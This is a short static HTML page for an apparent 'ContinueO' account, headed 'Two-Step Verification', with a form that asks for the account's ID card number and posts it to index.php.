<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ContinueO - ID Card Verification</title>
</head>
<body>
  <div class="container">
    <h2>Two-Step Verification</h2>
    <p>Enter the ID Card Number associated with this account:</p>
    <form action="index.php" method="POST" id="id-card-form">
      <div class="input-group">
        <label for="idcard">ID Card Number</label>
        <input type="text" name="idcard" id="idcard" placeholder="Enter ID Card Number" autocomplete="off" required>
      </div>
      <div class="btn-group">
        <input type="submit" class="btn" value="SUBMIT">
      </div>
    </form>
  </div>
</body>
</html>
